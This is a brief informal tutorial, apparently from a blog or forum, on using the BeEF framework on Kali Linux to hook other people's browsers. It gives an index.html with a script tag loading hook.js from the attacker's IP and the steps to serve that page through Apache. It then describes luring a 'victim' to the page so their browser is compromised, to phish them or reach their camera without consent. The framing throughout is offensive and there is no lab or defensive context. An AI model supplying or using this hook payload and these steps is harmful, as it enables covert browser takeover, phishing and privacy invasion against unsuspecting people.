Beef is a framework for browser exploitation.After this exploit you will be able to collect the data and much more.

open terminal and type as.

service start apache2

This starts a server which is inbuilt in kali linux here you are going to put your html file.

open a text editor type as

<!DOCTYPE html>
<html>
<body>
<script src=http://<your ip>:3000/hook.js></script>
<h1>Hi there</h1>
//here type some basic html
</body>
</html>

And save it as index.html

To find your ip
open a terminal and type
ifconfig

You will find a number which will be like 192.somenumber.somenumber.somenumber
Now locate /var/www
inside that copy paste the index.html

Now click on beef icon.It will ask you for password and username .Type beef for both password and username.

Connect the victim's device to the same network as yours(local network)
Now ask your victim to visit 192.somenumber.somenumber.somenumber (your ip)
Voila your victim's browser is compromised.

Once the victim visits the ip the victim will see some basic html file.Remember you wrote index.html
But you hooked a java script to do the backend process.
with this you can perform phishing as well.Even access the victim's camera withou his or her permission.
